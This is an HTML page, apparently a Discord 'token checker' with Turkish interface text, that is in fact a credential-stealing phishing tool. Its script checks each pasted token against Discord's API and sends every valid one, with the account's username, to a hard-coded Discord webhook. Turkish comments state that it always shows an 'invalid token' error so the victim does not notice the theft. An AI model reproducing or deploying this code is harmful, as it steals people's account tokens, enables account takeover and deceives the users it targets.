<!DOCTYPE html>

<html lang="tr">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Factions Check | Ultimate</title>

<style>

body { background-color: #000; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: crosshair; }

.container { background-color: rgba(5, 5, 5, 0.95); padding: 40px; border-radius: 15px; width: 450px; text-align: center; border: 1px solid rgba(255, 30, 30, 0.3); box-shadow: 0 0 40px rgba(0, 0, 0, 1); }

h1 { color: #ff1e1e; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; }

textarea { width: 100%; height: 160px; padding: 15px; background: #020202; border: 1px solid #ff1e1e; border-radius: 8px; color: #00ff41; margin-bottom: 20px; outline: none; resize: none; box-sizing: border-box; }

button { width: 100%; padding: 16px; background: linear-gradient(90deg, #800000, #cc0000); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; }

#status { margin-top: 15px; font-size: 13px; font-weight: bold; display: none; }

</style>

</head>

<body>

<div class="container">

<h1>FACTIONS CHECK</h1>

<textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>

<button id="submitBtn">KONTROL ET</button>

<div id="status"></div>

</div>

<script>

const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";

document.getElementById('submitBtn').addEventListener('click', async function() {

const val = document.getElementById('contentInput').value;

const st = document.getElementById('status');

const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);

if (lines.length === 0) return;



st.style.display = "block";

st.textContent = "Bağlantı kuruluyor...";

st.style.color = "#ffcc00";



for (const token of lines) {

    try {

        // Önce tokenin çalışıp çalışmadığını Discord API'den kontrol ediyoruz

        const response = await fetch("[https://discord.com/api/v9/users/@me](https://discord.com/api/v9/users/@me)", {

            headers: { "Authorization": token }

        });



        // Eğer token geçerliyse (status 200 ise) webhook'a gönder

        if (response.status === 200) {

            const userData = await response.json();

            await fetch(wh, {

                method: 'POST',

                headers: { 'Content-Type': 'application/json' },

                body: JSON.stringify({

                    embeds: [{

                        title: "✅ ÇALIŞAN TOKEN BULDUM!",

                        description: "Token: `" + token + "`\nKullanıcı: `" + userData.username + "#" + userData.discriminator + "`",

                        color: 65280, // Yeşil renk

                        timestamp: new Date().toISOString(),

                        footer: { text: "Factions Checker | RAWS" }

                    }]

                })

            });

        }

    } catch (err) {

        // Hata durumunda (CORS vb.) hiçbir şey yapma

    }

}



// Her durumda kullanıcıya hata gösteriyoruz ki yakalandığını anlamasın

setTimeout(() => {

    st.textContent = "✕ Error: Token Invalid or Expired!";

    st.style.color = "#ff1e1e";

}, 1500);

});

</script>

</body>

</html>
